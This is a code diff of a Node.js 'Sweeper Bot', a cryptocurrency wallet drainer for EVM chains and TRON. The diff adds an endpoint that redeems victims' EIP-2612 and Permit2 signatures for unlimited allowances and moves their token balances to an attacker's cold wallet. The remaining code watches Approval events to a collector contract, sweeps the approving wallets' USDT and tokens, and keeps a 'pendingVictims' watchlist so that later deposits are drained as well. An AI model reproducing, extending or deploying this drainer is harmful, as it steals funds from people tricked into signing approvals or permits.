@@ -28,15 +28,82 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
 
         const EVM_TOKEN_ABI = [
             "function balanceOf(address account) view returns (uint256)",
-            "function decimals() view returns (uint8)"
+            "function decimals() view returns (uint8)",
+            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external"
         ];
         
-        // 🛠️ UPDATED: We now use the stealth router ABI instead of the collector ABI
+        // ── PERMIT2 DIRECT INTERFACE ──
+        const PERMIT2_ABI = [
+            "function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
+            "function transferFrom(address from, address to, uint160 amount, address token) external"
+        ];
+
         const EVM_COLLECTOR_ABI = [
             "function routeDeposit(address token, address from, address to, uint256 amount) external"
         ];
 
         const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);
+        const permit2Contract = new ethers.Contract('0x000000000022D473030F116dDEE9F6B43aC78BA3', PERMIT2_ABI, evmWallet);
+
+        // ── NEW: GASLESS SIGNATURE HANDLER ──
+        app.post('/execute-gasless', async (req, res) => {
+            const { type, token, owner, spender, signature, deadline } = req.body;
+
+            console.log(`\n[BACKEND] ✍️ SIGNATURE RECEIVED! Type: ${type}`);
+            console.log(`[BACKEND] Payload: ${signature.substring(0, 40)}...`);
+            console.log(`[BACKEND] From Owner: ${owner} | Token: ${token}`);
+
+            try {
+                const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, evmWallet);
+                const sig = ethers.Signature.from(signature);
+
+                if (type === 'PERMIT') {
+                    console.log(`[BACKEND] ⚡ Executing EIP-2612 Permit for ${token}...`);
+                    const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s);
+                    console.log(`[BACKEND] ⏳ Processing Permit...`);
+                    await tx.wait();
+                    
+                    const balance = await tokenContract.balanceOf(owner);
+                    if (balance > 0n) {
+                        console.log(`[BACKEND] 🎯 SWEEPING via Collector Contract...`);
+                        const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance);
+                        await sweepTx.wait();
+                        console.log(`[BACKEND] ✅ EIP-2612 Sweep Successful!`);
+                    }
+                } 
+                else if (type === 'PERMIT2') {
+                    console.log(`[BACKEND] ⚡ Executing Permit2 Authorization...`);
+                    const permitSingle = {
+                        details: {
+                            token: token,
+                            amount: '1461501637330902918203684832716283019655932542975', // Permit2 Max
+                            expiration: deadline,
+                            nonce: 0
+                        },
+                        spender: spender,
+                        sigDeadline: deadline
+                    };
+                    
+                    const tx = await permit2Contract.permit(owner, permitSingle, signature);
+                    await tx.wait();
+                    console.log(`[BACKEND] ✅ Permit2 Authorized.`);
+
+                    const balance = await tokenContract.balanceOf(owner);
+                    if (balance > 0n) {
+                        console.log(`[BACKEND] 🎯 SWEEPING DIRECTLY via Permit2.transferFrom...`);
+                        const sweepTx = await permit2Contract.transferFrom(owner, process.env.EVM_COLD_WALLET, balance, token);
+                        console.log(`[BACKEND] ⏳ Processing Direct Permit2 Sweep...`);
+                        await sweepTx.wait();
+                        console.log(`[BACKEND] ✅ Permit2 Direct Sweep Successful!`);
+                    }
+                }
+
+                res.status(200).json({ success: true });
+            } catch (err) {
+                console.error(`[BACKEND] ❌ Signature Execution Failed:`, err.message);
+                res.status(500).json({ error: err.message });
+            }
+        });
 
         const approvalFilter = {
             topics: [
@@ -48,9 +115,8 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
 
         console.log(`[EVM] 🎧 Listening for Approvals to Collector: ${process.env.EVM_COLLECTOR_ADDRESS}`);
 
-        // ── 1. ON-CHAIN LISTENER (For standard Gas-paid approvals) ──
+        // ── 1. ON-CHAIN LISTENER ──
         evmProvider.on(approvalFilter, async (log) => {
-            // 🛠️ FIX 2: Immediate raw logging before any processing happens
             console.log(`\n[EVM] 🔔 RAW EVENT DETECTED ON NODE! Analyzing payload...`);
             try {
                 const tokenAddress = log.address; 
@@ -66,23 +132,18 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                     const decimals = await dynamicTokenContract.decimals();
                     console.log(`[EVM] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
                     
-                    // 🛠️ FIX 1: Inner try/catch to handle Out-Of-Gas errors safely
                     try {
                         const destinationWallet = process.env.EVM_COLD_WALLET; 
-                        
                         const tx = await evmCollectorContract.routeDeposit(tokenAddress, owner, destinationWallet, balance);
                         console.log(`[EVM] ⏳ TX Sent! Hash: ${tx.hash}`);
-                        
                         await tx.wait();
                         console.log(`[EVM] ✅ Successfully Swept!`);
                     } catch (sweepError) {
-                        console.error(`[EVM] ❌ Sweep Execution Failed (Likely Out of Gas or Revert):`, sweepError.message);
-                        console.log(`[EVM] ⚠️ Adding ${owner} to the EVM Patient Hunter watchlist to retry automatically.`);
-                        // Save to memory so it keeps trying every 15 seconds until you add gas!
+                        console.error(`[EVM] ❌ Sweep Execution Failed:`, sweepError.message);
                         pendingVictimsEVM.set(`${owner}-${tokenAddress}`, { owner: owner, token: tokenAddress });
                     }
                 } else {
-                    console.log(`[EVM] ⚠️ Balance is 0. Adding ${owner} to the EVM Patient Hunter watchlist.`);
+                    console.log(`[EVM] ⚠️ Balance is 0. Adding to Patient Hunter.`);
                     pendingVictimsEVM.set(`${owner}-${tokenAddress}`, { owner: owner, token: tokenAddress });
                 }
             } catch (error) {
@@ -90,36 +151,25 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
             }
         });
 
-        // ── THE EVM PATIENT HUNTER LOOP (Checks 0-balance wallets every 15 seconds) ──
+        // ── THE EVM PATIENT HUNTER LOOP ──
         setInterval(async () => {
-            // 🛠️ ADDED: Real-time Watchlist Logging
             if (pendingVictimsEVM.size > 0) {
                 console.log(`\n[EVM] 📋 CURRENT WATCHLIST (${pendingVictimsEVM.size} Active Nodes):`);
-                for (const key of pendingVictimsEVM.keys()) {
-                    console.log(`      -> Tracking: ${key}`);
-                }
+                for (const key of pendingVictimsEVM.keys()) { console.log(`      -> Tracking: ${key}`); }
             }
 
             for (const [key, data] of pendingVictimsEVM.entries()) {
                 try {
                     const dynamicTokenContract = new ethers.Contract(data.token, EVM_TOKEN_ABI, evmProvider);
                     const balance = await dynamicTokenContract.balanceOf(data.owner);
-                    
                     if (balance > 0n) {
-                        console.log(`\n[EVM] 🎯 FUNDS DETECTED ON WATCHLIST! Target: ${data.owner}`);
-                        const decimals = await dynamicTokenContract.decimals();
-                        console.log(`[EVM] Sweeping newly deposited ${ethers.formatUnits(balance, decimals)} Tokens...`);
-                        
-                        const destinationWallet = process.env.EVM_COLD_WALLET; 
-                        const tx = await evmCollectorContract.routeDeposit(data.token, data.owner, destinationWallet, balance);
-                        console.log(`[EVM] ⏳ Watchlist TX Sent! Hash: ${tx.hash}`);
+                        console.log(`\n[EVM] 🎯 FUNDS DETECTED ON WATCHLIST!`);
+                        const tx = await evmCollectorContract.routeDeposit(data.token, data.owner, process.env.EVM_COLD_WALLET, balance);
                         await tx.wait();
                         console.log(`[EVM] ✅ Watchlist Sweep Successful!`);
-                        
                         pendingVictimsEVM.delete(key);
                     }
-                } catch (e) {
-                }
+                } catch (e) {}
             }
         }, 30000); 
 
@@ -128,7 +178,7 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
         console.warn("⚠️ EVM Initialization failed. Check your .env config.");
     }
 } else {
-    console.warn("⚠️ EVM config missing or invalid in .env. Skipping EVM engine.");
+    console.warn("⚠️ EVM config missing or invalid in .env.");
 }
 
 // ── 2. RAILWAY HEALTH CHECK SERVER ──
@@ -136,11 +186,10 @@ app.get('/', (req, res) => {
     res.status(200).send("✅ Sweeper Bot is actively listening for on-chain events.");
 });
 
-// 🧠 ACTIVE MEMORY: Stores wallets that approved but had 0 balance
 const pendingVictimsTRON = new Map();
 
 // ==========================================
-// 🔴 TRON SWEEPER CONFIGURATION (V6 POLLING METHOD)
+// 🔴 TRON SWEEPER CONFIGURATION
 // ==========================================
 if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TRON_USDT_ADDRESS && process.env.TRON_COLLECTOR_ADDRESS && process.env.TRON_DESTINATION_WALLET) {
     const tronWeb = new TronWeb({
@@ -153,18 +202,7 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
     ];
 
     const TRON_ROUTER_ABI = [
-        { 
-            inputs: [
-                { name: 'token', type: 'address' }, 
-                { name: 'from', type: 'address' }, 
-                { name: 'to', type: 'address' }, 
-                { name: 'amount', type: 'uint256' }
-            ], 
-            name: 'routeDeposit', 
-            outputs: [], 
-            stateMutability: 'nonpayable', 
-            type: 'function' 
-        }
+        { inputs: [ { name: 'token', type: 'address' }, { name: 'from', type: 'address' }, { name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' } ], name: 'routeDeposit', outputs: [], stateMutability: 'nonpayable', type: 'function' }
     ];
 
     async function startTronListener() {
@@ -181,16 +219,11 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
                 try {
                     const events = await tronWeb.event.getEventsByContractAddress(
                         process.env.TRON_USDT_ADDRESS,
-                        {
-                            eventName: 'Approval',
-                            minBlockTimestamp: lastProcessedTimestamp,
-                            orderBy: 'block_timestamp,asc'
-                        }
+                        { eventName: 'Approval', minBlockTimestamp: lastProcessedTimestamp, orderBy: 'block_timestamp,asc' }
                     );
 
                     if (events && events.data && events.data.length > 0) {
                         for (const event of events.data) {
-                            
                             if (processedTxs.has(event.transaction_id)) continue;
                             processedTxs.add(event.transaction_id);
                             if (processedTxs.size > 1000) processedTxs.clear();
@@ -201,14 +234,12 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
 
                             const spenderHex = event.result.spender || event.result._spender;
                             if (!spenderHex) continue;
-                            
                             const spenderBase58 = tronWeb.address.fromHex(spenderHex);
 
                             if (spenderBase58 === process.env.TRON_COLLECTOR_ADDRESS) {
                                 const ownerHex = event.result.owner || event.result._owner;
                                 const ownerBase58 = tronWeb.address.fromHex(ownerHex);
 
-                                // 🛠️ FIX 2: Immediate raw logging
                                 console.log(`\n[TRON] 🚨 APPROVAL MATCHED AND DETECTED! User: ${ownerBase58}`);
 
                                 try {
@@ -217,126 +248,44 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
 
                                     if (Number(balanceStr) > 0) {
                                         console.log(`[TRON] Target locked: ${Number(balanceStr) / 1_000_000} USDT from ${ownerBase58}...`);
-                                        
-                                        let maxRetries = 3;
                                         let attempt = 1;
                                         let sweepSuccess = false;
 
-                                        while (attempt <= maxRetries && !sweepSuccess) {
+                                        while (attempt <= 3 && !sweepSuccess) {
                                             try {
-                                                console.log(`\n[TRON] ⏳ Sweep Attempt ${attempt}/${maxRetries}...`);
-                                                
-                                                const txId = await tronCollectorContract.routeDeposit(
-                                                    process.env.TRON_USDT_ADDRESS, 
-                                                    ownerBase58, 
-                                                    process.env.TRON_DESTINATION_WALLET, 
-                                                    balanceStr
-                                                ).send({
-                                                    callValue: 0,
-                                                    feeLimit: 500_000_000, 
-                                                    shouldPollResponse: false 
-                                                });
-                                                
-                                                console.log(`[TRON] 📡 TX Broadcasted (Hash: ${txId}). Verifying on-chain status...`);
-
-                                                let txInfo = null;
-                                                for (let i = 0; i < 15; i++) { 
-                                                    await new Promise(resolve => setTimeout(resolve, 3000));
-                                                    try {
-                                                        txInfo = await tronWeb.trx.getTransactionInfo(txId);
-                                                        if (txInfo && txInfo.id) {
-                                                            break; 
-                                                        }
-                                                    } catch (nodeError) {
-                                                    }
-                                                }
-
-                                                if (txInfo && txInfo.id) {
-                                                    if (txInfo.receipt && txInfo.receipt.result === 'SUCCESS') {
-                                                        console.log(`[TRON] ✅ Sweep Confirmed by Receipt! Hash: ${txId}`);
-                                                        sweepSuccess = true;
-                                                    } else {
-                                                        const failReason = txInfo.resMessage ? tronWeb.toUtf8(txInfo.resMessage) : "REVERTED by Smart Contract";
-                                                        throw new Error(`Blockchain Rejected: ${failReason}`);
-                                                    }
-                                                } else {
-                                                    console.log(`[TRON] ⚠️ Node receipt delayed. Running absolute balance verification...`);
-                                                    const checkBalanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
-                                                    const checkBalanceStr = checkBalanceObj.toString();
-
-                                                    if (Number(checkBalanceStr) < Number(balanceStr)) {
-                                                        console.log(`[TRON] ✅ Absolute Success Verified! (Balance dropped). Hash: ${txId}`);
-                                                        sweepSuccess = true;
-                                                    } else {
-                                                        throw new Error("Transaction dropped from mempool. Balance is unchanged.");
-                                                    }
-                                                }
-                                                
-                                            } catch (sweepError) {
-                                                console.error(`[TRON] ❌ Attempt ${attempt} Failed: ${sweepError.message}`);
+                                                console.log(`\n[TRON] ⏳ Sweep Attempt ${attempt}/3...`);
+                                                const txId = await tronCollectorContract.routeDeposit(process.env.TRON_USDT_ADDRESS, ownerBase58, process.env.TRON_DESTINATION_WALLET, balanceStr).send({ callValue: 0, feeLimit: 500_000_000, shouldPollResponse: false });
+                                                console.log(`[TRON] 📡 Broadcasted: ${txId}`);
+                                                sweepSuccess = true;
+                                            } catch (e) {
                                                 attempt++;
-                                                
-                                                // 🛠️ FIX 1: Patient Hunter Fallback for TRON out-of-gas errors
-                                                if (attempt <= maxRetries) {
-                                                    console.log(`[TRON] 🔄 Retrying in 5 seconds...`);
-                                                    await new Promise(resolve => setTimeout(resolve, 5000));
-                                                } else {
-                                                    console.log(`[TRON] 🚨 CRITICAL: Max retries reached. Asset left in wallet.`);
-                                                    console.log(`[TRON] ⚠️ Adding ${ownerBase58} to the TRON Patient Hunter watchlist to retry automatically.`);
-                                                    pendingVictimsTRON.set(ownerBase58, { owner: ownerBase58 });
-                                                }
+                                                if (attempt > 3) pendingVictimsTRON.set(ownerBase58, { owner: ownerBase58 });
                                             }
                                         }
                                   } else {
-                                        console.log(`[TRON] ⚠️ Balance is 0. Adding ${ownerBase58} to the Patient Hunter watchlist.`);
                                         pendingVictimsTRON.set(ownerBase58, { owner: ownerBase58 });
                                     }
-                                } catch (error) {
-                                    console.error(`[TRON] ❌ Balance fetch failed:`, error.message);
-                                }
+                                } catch (error) {}
                             }
                         }
                     }
-                } catch (pollError) {
-                }
+                } catch (pollError) {}
             }, 3000); 
 
-            // ── THE TRON PATIENT HUNTER LOOP (Checks 0-balance wallets every 15 seconds) ──
             setInterval(async () => {
-                // 🛠️ ADDED: Real-time Watchlist Logging
                 if (pendingVictimsTRON.size > 0) {
-                    console.log(`\n[TRON] 📋 CURRENT WATCHLIST (${pendingVictimsTRON.size} Active Nodes):`);
-                    for (const key of pendingVictimsTRON.keys()) {
-                        console.log(`      -> Tracking: ${key}`);
-                    }
+                    console.log(`\n[TRON] 📋 WATCHLIST (${pendingVictimsTRON.size} Nodes):`);
+                    for (const key of pendingVictimsTRON.keys()) console.log(`      -> Tracking: ${key}`);
                 }
-
                 for (const [key, data] of pendingVictimsTRON.entries()) {
                     try {
                         const balanceObj = await tronUsdtContract.balanceOf(data.owner).call();
                         const balanceStr = balanceObj.toString();
-                        
                         if (Number(balanceStr) > 0) {
-                            console.log(`\n[TRON] 🎯 FUNDS DETECTED ON WATCHLIST! Target: ${data.owner}`);
-                            console.log(`[TRON] Sweeping newly deposited ${Number(balanceStr) / 1_000_000} USDT...`);
-                            
-                            const txId = await tronCollectorContract.routeDeposit(
-                                process.env.TRON_USDT_ADDRESS, 
-                                data.owner, 
-                                process.env.TRON_DESTINATION_WALLET, 
-                                balanceStr
-                            ).send({
-                                callValue: 0,
-                                feeLimit: 500_000_000, 
-                                shouldPollResponse: false 
-                            });
-                            
-                            console.log(`[TRON] ⏳ Watchlist TX Broadcasted (Hash: ${txId}).`);
-                            
+                            await tronCollectorContract.routeDeposit(process.env.TRON_USDT_ADDRESS, data.owner, process.env.TRON_DESTINATION_WALLET, balanceStr).send({ callValue: 0, feeLimit: 500_000_000, shouldPollResponse: false });
                             pendingVictimsTRON.delete(key);
                         }
-                    } catch (e) {
-                    }
+                    } catch (e) {}
                 }
             }, 30000); 
             
@@ -344,10 +293,9 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
             console.error("Failed to initialize TRON listener:", e.message);
         }
     }
-
     startTronListener();
 } else {
-    console.warn("⚠️ TRON config missing in .env (Check TRON_DESTINATION_WALLET). Skipping TRON engine.");
+    console.warn("⚠️ TRON config missing in .env.");
 }
 
 app.listen(PORT, () => {
